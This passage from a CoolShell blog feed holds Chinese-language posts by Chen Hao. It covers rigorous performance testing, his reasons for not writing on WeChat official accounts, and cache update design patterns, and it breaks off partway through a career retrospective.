<p>比如：我们有一组数据：[ 10ms,  1s, 200ms, 100ms]，我们把其从小到大排个序：[10ms, 100ms, 200ms, 1s]，于是我们知道，TP50，就是50%的请求ceil(4*0.5)=2时间是小于100ms的，TP90就是90%的请求ceil(4*0.9)=4时间小于1s。于是：TP50就是100ms，TP90就是1s。</p>
<p>我以前在路透做的金融系统响应时间的性能测试的要求是这样的，<strong>99.9%的请求必须小于1ms，所有的平均时间必须小于1ms。两个条件的限制。</strong></p>
<h4>
<span class="ez-toc-section" id="%E4%B8%BA%E4%BB%80%E4%B9%88%E5%93%8D%E5%BA%94%E6%97%B6%E9%97%B4%EF%BC%88latency%EF%BC%89%E8%A6%81%E5%92%8C%E5%90%9E%E5%90%90%E9%87%8F%EF%BC%88Thoughput%EF%BC%89%E6%8C%82%E9%92%A9"></span>为什么响应时间（latency）要和吞吐量（Thoughput）挂钩<span class="ez-toc-section-end"></span>
</h4>
<p>系统的性能如果只看吞吐量，不看响应时间是没有意义的。我的系统可以顶10万请求，但是响应时间已经到了5秒钟，这样的系统已经不可用了，这样的吞吐量也是没有意义的。</p>
<p>我们知道，当并发量（吞吐量）上涨的时候，系统会变得越来越不稳定，响应时间的波动也会越来越大，响应时间也会变得越来越慢，而吞吐率也越来越上不去（如下图所示），包括CPU的使用率情况也会如此。所以，当系统变得不稳定的时候，吞吐量已经没有意义了。吞吐量有意义的时候仅当系统稳定的时候。</p>
<p><img alt="image placeholder" ></p>
<p>所以，<strong>吞吐量的值必需有响应时间来卡。</strong>比如：<strong>TP99小于100ms的时候，系统可以承载的最大并发数是1000qps</strong>。这意味着，我们要不断的在不同的并发数上测试，以找到软件的最稳定时的最大吞吐量。</p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E4%B8%BA%E4%BB%80%E4%B9%88%E5%93%8D%E5%BA%94%E6%97%B6%E9%97%B4%E5%90%9E%E5%90%90%E9%87%8F%E5%92%8C%E6%88%90%E5%8A%9F%E7%8E%87%E8%A6%81%E6%8C%82%E9%92%A9"></span>为什么响应时间吞吐量和成功率要挂钩<span class="ez-toc-section-end"></span>
</h4>
<p>我们这应该不难理解了，如果请求不成功的话，都还做毛的性能测试。比如，我说我的系统并发可以达到10万，但是失败率是</p>
<p>40%，那么，这10万的并发完全就是一个笑话了。</p>
<p>性能测试的失败率的容忍应该是非常低的。对于一些关键系统，成功请求数必须在100%，一点都不能含糊。</p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E5%A6%82%E4%BD%95%E4%B8%A5%E8%B0%A8%E5%9C%B0%E5%81%9A%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95"></span>如何严谨地做性能测试<span class="ez-toc-section-end"></span>
</h4>
<p>一般来说，性能测试要统一考虑这么几个因素：<strong>Thoughput吞吐量</strong>，<strong>Latency响应时间</strong>，<strong>资源利用</strong>（CPU/MEM/IO/Bandwidth…），<strong>成功率</strong>，<strong>系统稳定性</strong>。</p>
<p>下面的这些性能测试的方式基本上来源自我的老老东家汤森路透，一家做real-time的金融数据系统的公司。</p>
<p style="padding-left: 30px;"><strong>一，你得定义一个系统的响应时间latency，建议是TP99，以及成功率</strong>。比如路透的定义：99.9%的响应时间必需在1ms之内，平均响应时间在1ms以内，100%的请求成功。</p>
<p style="padding-left: 30px;"><strong>二，在这个响应时间的限制下，找到最高的吞吐量</strong>。测试用的数据，需要有大中小各种尺寸的数据，并可以混合。最好使用生产线上的测试数据。</p>
<p style="padding-left: 30px;"><strong>三，在这个吞吐量做Soak Test，比如：使用第二步测试得到的吞吐量连续7天的不间断的压测系统。</strong>然后收集CPU，内存，硬盘/网络IO，等指标，查看系统是否稳定，比如，CPU是平稳的，内存使用也是平稳的。那么，这个值就是系统的性能</p>
<p style="padding-left: 30px;"><strong>四，找到系统的极限值。比如：在成功率100%的情况下（不考虑响应时间的长短），系统能坚持10分钟的吞吐量。</strong></p>
<p style="padding-left: 30px;"><strong>五，做Burst Test。用第二步得到的吞吐量执行5分钟，然后在第四步得到的极限值执行1分钟，再回到第二步的吞吐量执行5钟，再到第四步的权限值执行1分钟，如此往复个一段时间，比如2天。</strong>收集系统数据：CPU、内存、硬盘/网络IO等，观察他们的曲线，以及相应的响应时间，确保系统是稳定的。</p>
<p style="padding-left: 30px;"><strong>六、低吞吐量和网络小包的测试。</strong>有时候，在低吞吐量的时候，可能会导致latency上升，比如TCP_NODELAY的参数没有开启会导致latency上升（详见<a href="https://coolshell.cn/articles/11564.html" target="_blank">TCP的那些事</a>），而网络小包会导致带宽用不满也会导致性能上不去，所以，性能测试还需要根据实际情况有选择的测试一下这两咱场景。</p>
<p>（注：在路透，路透会用第二步得到的吞吐量乘以66.7%来做为系统的软报警线，80%做为系统的硬报警线，而极限值仅仅用来扛突发的peak）</p>
<p><strong>是不是很繁锁？是的，只因为，这是工程，工程是一门科学，科学是严谨的。</strong></p>
<p>欢迎大家也分享一下你们性能测试的经验和方法。</p>
<p>（全文完）</p>
<p> </p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2016-07-06T01:03:26+08:00</pubDate>
<guid>https://coolshell.cn/articles/17381.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 为什么我不在微信公众号上写文章 ]]></title>
<link>https://coolshell.cn/articles/17391.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >很多朋友问我为什么不在微信公众号上写文章。我都没有直接回答，老实说，我也是扭扭捏捏的，才去开了个个人的微信的公众号，而且还只是为了使用微服小程序，和文章的发布通知，我承认现在的阅读都在移动端，而且微信的公众号是国内移动端的文章流量及分享的入口，但是我还是更愿意使用blog这样的方式分享文章，最多也是在blog这边写好文章后，再去微信公众号那边通知一下。这个原因，不是因为我是一个老顽固，有习惯思维，而是，我不觉得微信公众号是一个好的信息传播和交流的平台。</p>
<p><strong>我下面的言论仅仅代表我的个人观点，我不想强加给别人，我只是想说明一下为什么我不把我的blog迁移到微信公众号上。</strong></p>
<p>首先，互联网是开放和共享的，不是封闭的。信息的传播更是需要开放的，大家可以看看<a href="https://coolshell.cn/articles/11928.html" target="_blank" rel="noopener noreferrer">互联网之子</a>。</p>
<ul>
<li>我希望我的文章能够被rss feed到各种阅读器中。</li>
<li>我希望我的文章能有更长的生命周期，长到十几年前的文章都会有人来读。</li>
<li>我希望我的文章可以被搜索引擎所检索到。</li>
<li>我希望我的文章能被别人整理，与其它人的文章放在一起互补并引用。</li>
<li>我希望我的文章能被修改，因为文章会有错误，也会需要时常更新。</li>
</ul>
<p>然而，微信公众号都不能很好的支持。我希望我的文章能成为生态圈的里的一部份。所谓生态圈是相互融合，不是唯我独尊。这个和做开源软件的道理一样，开源软件不是把源代码开出来就好了，而是要去和已有的其它软件互相融合，互相兼容，互相支持，这本就是软件设计的真谛（参看《UNIX编程艺术》）。所以，我想，写文章也一样。</p>
<p>下面是我觉得文章传播的姿势。</p>
<p><span id="more-17391"></span></p>
<h4>文章传播的姿势</h4>
<p><strong>我希望我的文章是被检索的，这意味着，就算文章写过了好多年，它依然可以被检索到，而不是在社交圈上被大众转了3-4天后就完了，然后再也没有然后了</strong>。</p>
<p style="padding-left: 30px;">今天，我十多年前写的文章依然可以被检索到，依然对后来的新人有帮助。因为我的文章被搜索引擎检索了，我的文章被转载fork出去了，被人引用和标注，所以，可以长期被传播。</p>
<p style="padding-left: 30px;">今天的酷壳（CoolShell.cn）已经很长时间没有更新了，然而里面的很多文章依然在被转发着，在被搜索着，在被重复阅读和被人推荐着，文章不断的被后来的人阅读。这就是被检索被共享被转载的好处。</p>
<p>同时，我并不希望成为某个平台写文章的苦力。在微信公众号下，你需要不断的更新才会积累起人气（订阅者），而文章的保鲜期非常有限，因为不能被检索，所以，你写的越多，你过去的文章也会被遗忘的越快。<strong>而微信公众平台让能写文章的人好像成为了这个平台的一个写作的奴隶，而不是让他们的文章中的内容和观点可以有长时间的影响力</strong>。换言之，在社交网络上，如果你要有影响力，你就要使劲写，需要更多的粉丝和订阅者。我个人认为这是违反了信息传播规律的。</p>
<p><strong>最重要的是，我希望我的文章和观点是有讨论的，希望我的文章能被指正和批评，最好是引发讨论和思辨</strong>，这样才会让我们每一个人都可以在交流中成长。<strong>很多时候，文章本身并没有什么太大的价值，而引发的讨论和思辨才更有价值，这是我认为文章传播最正确的姿势。而微信的公众号在讨论方面人为的阻止或大大消弱了大家的沟通和讨论（尤其是精选评论）</strong>。虽然我承认有些讨论也是无效的，而且还有漫骂和跑题，但是我依然觉得百花齐放的讨论的利大于弊。</p>
<p>我私以为，<strong>信息的传播正确姿势，是被检索、讨论、引用、整理、补充和更新，而不是社交网络的转发、点赞、粉丝、订阅和打赏</strong>。</p>
<p>换句话说，<strong>我关注的是的文章的长期价值，而不是短期的表象</strong>。</p>
<h4>关于文章的版权</h4>
<p>很多人认为，封闭的平台有个比开放平台天然的优势，就是盗版和抄袭的问题，可以通过平台举报和惩罚对方。我以前也受到一些被抄袭和盗用的困扰，还曾经拿起来法律的武器维护自己的权利。</p>
<p>可能是我经历这样的事情比较早，所以，我今天在这个问题上不纠结了。</p>
<p style="padding-left: 30px;">1、好的有价值的文章总是被人盗用抄袭的，这也算是对作者的一种认可吧。</p>
<p style="padding-left: 30px;">2、我从来没有见过有人靠抄袭和盗用别人文章而成功的，无非就是收获几个赞罢了。</p>
<p style="padding-left: 30px;">3、原创文章被人过抄袭和盗用，反而容易得到更多的关注。</p>
<p><strong>微信公众号的原创保护也只是局限在微信上，微信之外的平台，它也无能为力，所以，对于我的文章会被转到很多地方的这种情况来看，微信公众号的原创保护也非常有限。</strong></p>
<p>现在，我倒是不纠结有人会盗用和抄袭我的文章，因为，一方面，你可以有一些小伎俩来保护你的文章，比如在文章内容中放入一些你自己特有的标识，另一方面，我的文章被人盗用了抄袭的时候，总有一些网友能在盗用者那边指出来原文章是什么，并批评之。<strong>所以，还是应该把主要精力放在文章的内容和质量上，并让文章可以被检索和被更多的地方所引用，这样，你的文章才会得到最大的保护</strong>。</p>
<p>另外，<strong>既然别人对我的文章有抄袭和盗用的需求，要不我就让别人干得更体面一些。所以，我的文章完全可以自由的转载，但不得用于商业目的，只需要注明作者和出处就好了</strong>。</p>
<p> </p>
<h4>关于写文章挣钱</h4>
<p>首先，如果你觉得在微信公众号上写技术文章是可以挣钱的，那么恐怕你搞错了，营销文是可以的，技术文章还是比较难的。</p>
<p>当然，你要挣点小钱是可以有的，但是，你需要写软文中植入广告，或是消费热点主题，比如前段时间的魏则西事件，有的公众号被打赏了一些钱。</p>
<p>老实说，这对我来说完全无感，因为，我的逻辑是这样的：<strong>我觉得一个人有一定的影响力，其中有很大一部份原因来自他的独立性，如果我开始写软文了，相当于我把自己卖了</strong>。</p>
<p>所以，我现在从来不通过写文章挣钱，因为我会写代码，我还是通过我的技能挣钱，通过给一些公司做咨询、培训、企业服务挣钱，老实说，靠自己的能力挣钱，比写文章挣钱挣得多多了，因为我觉得，<strong>像我写的这类的文章本来就是用来分享和传播的，不是用来挣钱的。写文章的目的是分享和影响，不是挣钱。</strong></p>
<p>关于独立性，这里说两个花絮吧——</p>
<p style="padding-left: 30px;">我在Amazon的时候，我和公司讲，我想在我的博客上写几篇关于亚马逊的文章，介绍亚马逊的技术和一些做事的方法，也算是个宣传，让我的团队也好招人，但是，我当时的老板和我说，你的博客之所以有影响力是因为你的独立性，不要写亚马逊的，这样会把你自己卖了，千万别这么做。</p>
<p style="padding-left: 30px;">然而，我在Alibaba的时候，我的大老板要求我用我的博客和微博帮阿里云做营销，我非常委婉地拒绝了，结果，团队合作的价值观不达标了。呵呵。</p>
<p>P.S. 本来酷壳上是不做广告的，今天，酷壳上也广告，但是广告费是全部捐给Wikipedia的，广告主的钱是没有到我的手的。</p>
<p>微信公众号上的文章都有软文和广告植放，我觉得这不是我的调调，我害怕微信公众平台的整体格调影响了我的格调。就好像我认为我的网络被百度检索到了会我的网站的格调下降好几个档次。所以，我还是保持一定的距离吧。</p>
<p><strong>这么说吧，我写文章不是为了挣钱，我也不认为写文章能挣到钱，我写文章就是为了分享和影响，我会借助社交网络，但不会寄宿在社交网络上，更不会被社交网络所绑架。</strong></p>
<p>谢谢看我的唠叨！</p>
<p>（全文完）</p>
<p> </p>
<p><audio style="display: none;" controls="controls"></audio></p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2016-07-11T09:08:40+08:00</pubDate>
<guid>https://coolshell.cn/articles/17391.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 缓存更新的套路 ]]></title>
<link>https://coolshell.cn/articles/17416.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >看到好些人在写更新缓存数据代码时，<strong>先删除缓存，然后再更新数据库</strong>，而后续的操作会把数据再装载的缓存中。<strong>然而，这个是逻辑是错误的</strong>。试想，两个并发操作，一个是更新操作，另一个是查询操作，更新操作删除缓存后，查询操作没有命中缓存，先把老数据读出来后放到缓存中，然后更新操作更新了数据库。于是，在缓存中的数据还是老的数据，导致缓存中的数据是脏的，而且还一直这样脏下去了。</p>
<p>我不知道为什么这么多人用的都是这个逻辑，当我在微博上发了这个贴以后，我发现好些人给了好多非常复杂和诡异的方案，所以，我想写这篇文章说一下几个缓存更新的Design Pattern（让我们多一些套路吧）。</p>
<p>这里，我们先不讨论更新缓存和更新数据这两个事是一个事务的事，或是会有失败的可能，我们先假设更新数据库和更新缓存都可以成功的情况（我们先把成功的代码逻辑先写对）。</p>
<p>更新缓存的的Design Pattern有四种：Cache aside, Read through, Write through, Write behind caching，我们下面一一来看一下这四种Pattern。</p>
<p><span id="more-17416"></span></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#Cache_Aside_Pattern" title="Cache Aside Pattern">Cache Aside Pattern</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-2" href="#ReadWrite_Through_Pattern" title="Read/Write Through Pattern">Read/Write Through Pattern</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-3" href="#Read_Through" title="Read Through">Read Through</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#Write_Through" title="Write Through">Write Through</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#Write_Behind_Caching_Pattern" title="Write Behind Caching Pattern">Write Behind Caching Pattern</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%86%8D%E5%A4%9A%E5%94%A0%E5%8F%A8%E4%B8%80%E4%BA%9B" title="再多唠叨一些">再多唠叨一些</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="Cache_Aside_Pattern"></span>Cache Aside Pattern<span class="ez-toc-section-end"></span>
</h4>
<p>这是最常用最常用的pattern了。其具体逻辑如下：</p>
<ul>
<li>
<strong>失效</strong>：应用程序先从cache取数据，没有得到，则从数据库中取数据，成功后，放到缓存中。</li>
</ul>
<ul>
<li>
<strong>命中</strong>：应用程序从cache中取数据，取到后返回。</li>
</ul>
<ul>
<li>
<strong>更新</strong>：先把数据存到数据库中，成功后，再让缓存失效。</li>
</ul>
<p><img alt="image placeholder" ></p>
<p><img alt="image placeholder" ></p>
<p>注意，我们的更新是先更新数据库，成功后，让缓存失效。那么，这种方式是否可以没有文章前面提到过的那个问题呢？我们可以脑补一下。</p>
<p>一个是查询操作，一个是更新操作的并发，首先，没有了删除cache数据的操作了，而是先更新了数据库中的数据，此时，缓存依然有效，所以，并发的查询操作拿的是没有更新的数据，但是，更新操作马上让缓存的失效了，后续的查询操作再把数据从数据库中拉出来。而不会像文章开头的那个逻辑产生的问题，后续的查询操作一直都在取老的数据。</p>
<p>这是标准的design pattern，包括Facebook的论文《<a href="https://www.usenix.org/system/files/conference/nsdi13/nsdi13-final170_update.pdf" target="_blank">Scaling Memcache at Facebook</a>》也使用了这个策略。为什么不是写完数据库后更新缓存？你可以看一下Quora上的这个问答《<a href="https://www.quora.com/Why-does-Facebook-use-delete-to-remove-the-key-value-pair-in-Memcached-instead-of-updating-the-Memcached-during-write-request-to-the-backend">Why does Facebook use delete to remove the key-value pair in Memcached instead of updating the Memcached during write request to the backend?</a>》，主要是怕两个并发的写操作导致脏数据。</p>
<p>那么，是不是Cache Aside这个就不会有并发问题了？不是的，比如，一个是读操作，但是没有命中缓存，然后就到数据库中取数据，此时来了一个写操作，写完数据库后，让缓存失效，然后，之前的那个读操作再把老的数据放进去，所以，会造成脏数据。</p>
<p>但，这个case理论上会出现，不过，实际上出现的概率可能非常低，因为这个条件需要发生在读缓存时缓存失效，而且并发着有一个写操作。而实际上数据库的写操作会比读操作慢得多，而且还要锁表，而读操作必需在写操作前进入数据库操作，而又要晚于写操作更新缓存，所有的这些条件都具备的概率基本并不大。</p>
<p><strong>所以，这也就是Quora上的那个答案里说的，要么通过2PC或是Paxos协议保证一致性，要么就是拼命的降低并发时脏数据的概率，而Facebook使用了这个降低概率的玩法，因为2PC太慢，而Paxos太复杂。当然，最好还是为缓存设置上过期时间。</strong></p>
<h4>
<span class="ez-toc-section" id="ReadWrite_Through_Pattern"></span>Read/Write Through Pattern<span class="ez-toc-section-end"></span>
</h4>
<p>我们可以看到，在上面的Cache Aside套路中，我们的应用代码需要维护两个数据存储，一个是缓存（Cache），一个是数据库（Repository）。所以，应用程序比较啰嗦。而Read/Write Through套路是把更新数据库（Repository）的操作由缓存自己代理了，所以，对于应用层来说，就简单很多了。<strong>可以理解为，应用认为后端就是一个单一的存储，而存储自己维护自己的Cache。</strong></p>
<h5>
<span class="ez-toc-section" id="Read_Through"></span>Read Through<span class="ez-toc-section-end"></span>
</h5>
<p>Read Through 套路就是在查询操作中更新缓存，也就是说，当缓存失效的时候（过期或LRU换出），Cache Aside是由调用方负责把数据加载入缓存，而Read Through则用缓存服务自己来加载，从而对应用方是透明的。</p>
<h5>
<span class="ez-toc-section" id="Write_Through"></span>Write Through<span class="ez-toc-section-end"></span>
</h5>
<p>Write Through 套路和Read Through相仿，不过是在更新数据时发生。当有数据更新的时候，如果没有命中缓存，直接更新数据库，然后返回。如果命中了缓存，则更新缓存，然后再由Cache自己更新数据库（这是一个同步操作）</p>
<p>下图自来Wikipedia的<a href="https://en.wikipedia.org/wiki/Cache_(computing)">Cache词条</a>。其中的Memory你可以理解为就是我们例子里的数据库。</p>
<p><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="Write_Behind_Caching_Pattern"></span>Write Behind Caching Pattern<span class="ez-toc-section-end"></span>
</h4>
<p>Write Behind 又叫 Write Back。<strong>一些了解Linux操作系统内核的同学对write back应该非常熟悉，这不就是Linux文件系统的Page Cache的算法吗？是的，你看基础这玩意全都是相通的。</strong>所以，基础很重要，我已经不是一次说过基础很重要这事了。</p>
<p>Write Back套路，一句说就是，在更新数据的时候，只更新缓存，不更新数据库，而我们的缓存会异步地批量更新数据库。这个设计的好处就是让数据的I/O操作飞快无比（因为直接操作内存嘛 ），因为异步，write backg还可以合并对同一个数据的多次操作，所以性能的提高是相当可观的。</p>
<p>但是，其带来的问题是，数据不是强一致性的，而且可能会丢失（我们知道Unix/Linux非正常关机会导致数据丢失，就是因为这个事）。在软件设计上，我们基本上不可能做出一个没有缺陷的设计，就像算法设计中的时间换空间，空间换时间一个道理，有时候，强一致性和高性能，高可用和高性性是有冲突的。软件设计从来都是取舍Trade-Off。</p>
<p>另外，Write Back实现逻辑比较复杂，因为他需要track有哪数据是被更新了的，需要刷到持久层上。操作系统的write back会在仅当这个cache需要失效的时候，才会被真正持久起来，比如，内存不够了，或是进程退出了等情况，这又叫lazy write。</p>
<p>在wikipedia上有一张write back的流程图，基本逻辑如下：</p>
<p><img alt="image placeholder" ></p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E5%86%8D%E5%A4%9A%E5%94%A0%E5%8F%A8%E4%B8%80%E4%BA%9B"></span>再多唠叨一些<span class="ez-toc-section-end"></span>
</h4>
<p>1）上面讲的这些Design Pattern，其实并不是软件架构里的mysql数据库和memcache/redis的更新策略，这些东西都是计算机体系结构里的设计，比如CPU的缓存，硬盘文件系统中的缓存，硬盘上的缓存，数据库中的缓存。<strong>基本上来说，这些缓存更新的设计模式都是非常老古董的，而且历经长时间考验的策略</strong>，所以这也就是，工程学上所谓的Best Practice，遵从就好了。</p>
<p>2）有时候，我们觉得能做宏观的系统架构的人一定是很有经验的，其实，宏观系统架构中的很多设计都来源于这些微观的东西。比如，云计算中的很多虚拟化技术的原理，和传统的虚拟内存不是很像么？Unix下的那些I/O模型，也放大到了架构里的同步异步的模型，还有Unix发明的管道不就是数据流式计算架构吗？TCP的好些设计也用在不同系统间的通讯中，仔细看看这些微观层面，你会发现有很多设计都非常精妙……所以，<strong>请允许我在这里放句观点鲜明的话——如果你要做好架构，首先你得把计算机体系结构以及很多老古董的基础技术吃透了</strong>。</p>
<p>3）在软件开发或设计中，我非常建议在之前先去参考一下已有的设计和思路，<strong>看看相应的guideline，best practice或design pattern，吃透了已有的这些东西，再决定是否要重新发明轮子</strong>。千万不要似是而非地，想当然的做软件设计。</p>
<p>4）上面，我们没有考虑缓存（Cache）和持久层（Repository）的整体事务的问题。比如，更新Cache成功，更新数据库失败了怎么吗？或是反过来。关于这个事，如果你需要强一致性，你需要使用“两阶段提交协议”——prepare, commit/rollback，比如Java 7 的<a href="https://docs.oracle.com/javaee/7/api/javax/transaction/xa/XAResource.html" target="_blank">XAResource</a>，还有MySQL 5.7的 <a href="https://dev.mysql.com/doc/refman/5.7/en/xa.html" target="_blank">XA Transaction</a>，有些cache也支持XA，比如<a href="http://www.ehcache.org/documentation/3.0/xa.html" target="_blank">EhCache</a>。当然，XA这样的强一致性的玩法会导致性能下降，关于分布式的事务的相关话题，你可以看看《<a href="https://coolshell.cn/articles/10910.html" target="_blank">分布式系统的事务处理</a>》一文。</p>
<p>（全文完）</p>
<p> </p>
<p> </p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2016-07-27T16:25:28+08:00</pubDate>
<guid>https://coolshell.cn/articles/17416.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 这多年来我一直在钻研的技术 ]]></title>
<link>https://coolshell.cn/articles/17446.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >因为我是看到tinyfool 《<a href="https://weibo.com/ttarticle/p/show?id=2309404009795043653572" target="_blank">那些年我赶过的时髦技术趋势</a>》，在赞叹的时候，也让我对我有好些回忆，所以想写一篇回忆贴，本来觉得回忆是件挺让人沮喪的事，因为是老了的表现，但我写着写着，就歪了楼。看来，我还不老，还在拼博。下面是很多我的唠叨，你喜欢就读读，不喜欢就TLDR – Too Long, Don’t Read!</p>
<p>自从98年毕业，到今天，参加工作有18个年头了，加上在大三的时候就为两个在外面接活的老师程序，到今天，写的程序被用到生产线也有18个年头了。</p>
<h4>背景经历</h4>
<p>要说明我技术上的“性取向”，还得我说说的我的一些背景和经历。</p>
<p>我这18年，大约分三个阶段：</p>
<ul>
<li>
<b>1996年-2000年</b>：<b>入门乱来期</b>，大三大四加在银行工作的两年。
<ul>
<li><span class="font" style="color: #333333;"><span class="font" style="color: #333333;">用Powerbuilder/Delphi在WindowsNT/SQL Server上做了好多个MIS管理软件，有酒店的，有送水的，有OA的。</span></span></li>
<li><span class="font" style="color: #333333;"><span class="font" style="color: #333333;"> 用Java的Applet做了一个Web的教学课件，用于在Win95/IE3.0中演示操作系统中的各种调度和算法的动画，得了个全国大学生挑战者杯的鼓励奖。</span></span></li>
<li><span class="font" style="color: #333333;"> 用Delphi的ISAPI技术以及PHP/ASP给一些公司和大学做过几个网站。</span></li>
</ul>
</li>
</ul>
<p><span id="more-17446"></span></p>
<ul>
<li>
<b>2000年-2010年</b>：<b>技术学习期</b>，这十年，我主要的编程语言是C/C++。
<ul>
<li>前两年在银行用C语言在Unix（AIX/Solaris/Sco Unix/HP-UX..）写各种银行业务（用C语言写），用C写操作SQL，操作界面，写业务交易逻辑，一切都用C……，这是一个C语言的年代，<strong>当时，全国的银行都在做大集中，银行是当时行业里最大的软件系统了，所以，我确定了C/C++/Unix的技术方向</strong>，我当时的网上签名是，<em>C/C++/Unix才是大规模杀伤性武器</em>。</li>
<li>然后，2002年在Platform做一个全平台的（包括Unix/Linux/Windows）高性能计算的软件产品，很像今天的Hadoop，当时叫Grid Computing，主要用低廉的x86集群进行大规模的并行计算，主要用于芯片设计行业，如：ARM和德州仪器，或是科研，如NASA，或是国家安全，如美国国防部的影像分析，或是3D动画渲染，如怪物史瑞克……从05年以后，发现很多用户开始从Unix迁移到Linux，于是开始更为关注Linux的Kernel知识。<strong>Platform有一套很严谨的软件工程体系，我对严谨的软件工程以及很多的基础的技术的认识在这里形成</strong>。</li>
<li>2007年在路透做路透全球金融数据Real-Time网络的高性能调优（我在《<a href="https://coolshell.cn/articles/17381.html">性能测试应该怎么做？</a>》一文中透露过这个公司的性能要求，是一个实时的数据网络，对于99.9%的网络传输在100K的tps下要低于1ms，技术挑战是很大的），在路透，我只干一个事，就是性能优化，我把我负责的几个系统的性能都提升了8倍到15倍的样子，09年年底的时候，我已把未来3年的优化的活都干完了。所以，这个时期，我也开始了我的经理生涯。<strong>我对性能调优，高可用系统架构，研发管理的很多是在这里形成的。</strong>
</li>
</ul>
</li>
<li>
<b>2010年到今天</b>，<b>技术沉淀期</b>，这个时间段，主要的编程语言是Java。
<ul>
<li>这段时间，我加入了Amazon和Alibaba，也就是所谓的互联网公司。在Amazon干了两个事，一个是把Amazon全球的marketplace连起来，跨大洲的数据中心的通信，还有一个是第一次接触大数据和机器学习——用户需求预测系统。在Alibaba干过电商云平台聚石塔和阿里云，去阿里最主要的是经历双十一。</li>
<li>这段时间，对我影响比较大的是Amazon，技术不再是我的瓶颈，大规模的系统，对我也不是问题，而让我收获最大的是，<strong>世界前沿的软件设计架构和解决方案，以及做技术的态度和工程的方法，我的眼界、脑洞和视野都巨大的打开，并且在技术管理、工程管理、产品管理、人员管理、公司管理等等管理方面的思维有了质的提升</strong>。这段时间，才是我真正技术沉淀的时期。</li>
</ul>
</li>
</ul>
<p>我的这个背景本来可以更好一些，只可惜运气不太好，本来可以走的更快的，无奈在最关键的时候遇到了两次金融危机，本来可以去硅谷更牛更好的公司见世面，无奈父母身体欠安，只能放弃。</p>
<h4>经历决定思维方式</h4>
<p>通过我的背景经历，大家不难看到，我基本上都是做一些规模比较大的系统和软件，而且，主要用C/C++/Unix/Linux这样比较晦涩的语言和操作系统。我们知道用C和C++开发，基本上要处理的错误都是和系统底层相应的东西，而上规模的系统和软件，又总是会遇到很多“稀奇古怪”的问题，这些问题，都会逼着我要去了解很多的操作系统、计算机系统、网络、数据库、中间件等等的各种基础或底层技术。</p>
<p>而且我经历的基本上都是非常严谨的软件工程，不能马虎，我有几次马虎的经历，给我造成了非常大的心理影响，比如，曾经被定性为不适合写代码，因为我的代码太烂，或是出了严重的故障，几乎要跑路去了。另外，全球gloabl式的oncall，经常让我在凌晨被电话叫起来解决问题，这个经历比较痛苦。所以，<strong>我的整个经历，让我养成了，在软件开发上必需也不得不严谨的习惯和价值观体系</strong>。</p>
<p><strong>大家想想，用C/C++开发一个几乎不能出故障的软件系统，你需要多仔细和多严谨的态度才能达到要求？</strong>因此，我的经历让我不能马虎，也不能应付工作，更不能在标准上有所妥协，还需要不断地提高标准，所以，时间一长，我必然，会有如下的习惯：</p>
<ul>
<li>
<strong>要做到——知其然，知其所以然</strong>。所以，只能不断的学习基础知识以及和这个技术关联的知识，就像Wikipeida一样，当你进入一个词条的时候，就会伴随时一堆新词条，于是，当多年后，我看到 “<strong><a href="https://coolshell.cn/articles/4235.html" target="_blank">知识广度是深度的副产品</a></strong>”这句话时，简直就是说到我的心里去了。</li>
</ul>
<ul>
<li>
<strong>要做出工业级的软件</strong>。从银行到Platform到Thomson Reuters再到Amazon，软件开发上都会有SLA的要求。我认为，一个软件是工业级还是民用级的，除了功能正确之外，最重要的一个指标之一就是在性能和稳定性上有没有SLA。绝大多数的互联网公司和开源软件都没有SLA。所以，达不到工业级的标准。<strong>要达到工业级的标准，就需要花费时间、人力和财力进行非常繁琐的设计、测试评估以及运维管理</strong>。</li>
</ul>
<ul>
<li>
<strong>工业级的软件来自工业级专业人员和专业软件工程</strong>。
<ul>
<li>
<strong>专业的人员</strong>。为什么绝大多数的外国公司需要的是CS（Computer Science）背景毕业的工程师？因为他们要做的是工业级的软件，这是一门科学，即然是科学，就需要受过良好的科学教育的CS专业的人。</li>
<li>
<strong>专业的工程</strong>。工业级的软件需要有工业级的软件工程，比如，严谨的Design/Code Review，严格的测试，以及完备的线上运维。</li>
<li>
